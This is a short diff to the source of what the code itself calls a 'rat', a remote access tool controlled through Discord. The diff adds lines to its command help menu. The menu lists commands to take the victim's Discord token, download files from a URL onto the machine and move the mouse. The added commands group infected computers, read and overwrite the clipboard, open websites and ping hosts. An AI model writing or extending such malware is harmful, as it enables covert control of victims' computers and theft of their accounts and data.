@@ -58,6 +58,12 @@ namespace Discord_Main
                 "!Gettoken = Get discord token.\n" +
                 "!Mousepos(x position, y position) = Set mouse position.\n" +
                 "!Download_from_url(url, filename) = Downloads a file from url to computer.\n" +
+                "!Set_Group(channel) Sets the group of the computer.Max groups are 1.\n" +
+                "!Get_Group Gets the group this computer is in.\n" +
+                "!PingIp(ip, data) Ping a url/server/ip.\n" +
+                "!Website(url) Open Website.\n" +
+                "!Clipboard Get clipboard.\n" +
+                "!Set_Clipboard(Text) Set clipboard.\n" +
                 "!Exit = Close the rat.\n" +
                 "```"
                 );
